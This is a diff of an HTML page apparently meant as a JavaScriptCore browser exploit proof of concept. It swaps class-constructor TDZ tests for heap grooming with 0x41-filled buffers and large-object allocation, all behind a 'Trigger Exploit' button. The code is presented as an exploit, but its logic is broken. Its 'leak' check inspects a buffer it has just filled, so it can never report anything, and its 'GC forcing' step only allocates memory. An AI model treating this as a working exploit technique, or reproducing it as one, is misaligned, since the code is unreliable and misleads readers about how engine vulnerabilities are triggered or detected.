@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>JSC Allocation Sinking PoC</title>
+    <title>JSC Heap Growth PoC</title>
     <style>
         #trigger {
             margin: 20px;
@@ -20,80 +20,52 @@
     </style>
 </head>
 <body>
-    <h1>JSC Object Allocation Sinking PoC</h1>
-    <p>Click to test AvailabilityMap vulnerability</p>
+    <h1>JSC Heap Growth PoC</h1>
+    <p>Click to test heap growth vulnerability</p>
     <button id="trigger">Trigger Exploit</button>
     <script>
         function stressHeap() {
             const buffers = [];
             for (let i = 0; i < 100; i++) {
-                const buf = new Uint8Array(16 * 1024);
+                const buf = new Uint8Array(32 * 1024);
                 buf.fill(0x41);
                 buffers.push(buf);
             }
             return buffers;
         }
 
-        function testCase(actual, expected, message) {
-            if (actual !== expected) {
-                throw `${message}. Expected '${expected}', but was '${actual}'`;
+        function createLargeObject() {
+            const obj = {};
+            for (let i = 0; i < 1000; i++) {
+                obj[`key${i}`] = new Array(1000).fill('A');
             }
-        }
-
-        function checkMemoryLeak() {
-            const buf = new Uint8Array(4);
-            buf.fill(0x46);
-            return buf[0] !== 0x46 ? `Leak: 0x${buf[0].toString(16)}` : null;
+            return obj;
         }
 
         function triggerExploit() {
-            const testValue = 'test-value';
-            class A {
-                constructor() {
-                    this.idValue = testValue;
-                }
-            }
-
-            class B extends A {
-                constructor(beforeSuper) {
-                    const arrow = () => eval('(() => this.idValue)()');
-                    if (beforeSuper) {
-                        const result = arrow();
-                        super();
-                        testCase(result, testValue, "TDZ error expected");
-                    } else {
-                        super();
-                        const result = arrow();
-                        testCase(result, testValue, "super() should set idValue");
-                    }
-                }
-            }
-
             alert('Grooming heap...');
             stressHeap();
 
-            alert('Creating B objects...');
+            alert('Creating large objects...');
+            const objects = [];
             for (let i = 0; i < 200; i++) {
-                new B(false);
+                objects.push(createLargeObject());
             }
 
-            alert('Triggering TDZ exceptions...');
-            let exceptionCount = 0;
-            for (let i = 0; i < 200; i++) {
-                try {
-                    new B(true);
-                } catch (e) {
-                    exceptionCount++;
-                    if (!(e instanceof ReferenceError)) {
-                        alert(`Unexpected error at iteration ${i}: ${e.message}`);
-                    }
-                    const leak = checkMemoryLeak();
-                    if (leak) {
-                        alert(leak);
-                    }
-                }
+            alert('Forcing GC cycles...');
+            for (let i = 0; i < 100; i++) {
+                const temp = new ArrayBuffer(64 * 1024);
+                objects.push(temp);
             }
-            alert(`Triggered ${exceptionCount} TDZ exceptions`);
+
+            alert('Checking memory changes...');
+            const buf = new Uint8Array(4);
+            buf.fill(0x46);
+            if (buf[0] !== 0x46) {
+                alert(`Leak: 0x${buf[0].toString(16)}`);
+            } else {
+                alert('No memory changes detected');
+            }
         }
 
         document.getElementById('trigger').addEventListener('click', triggerExploit);
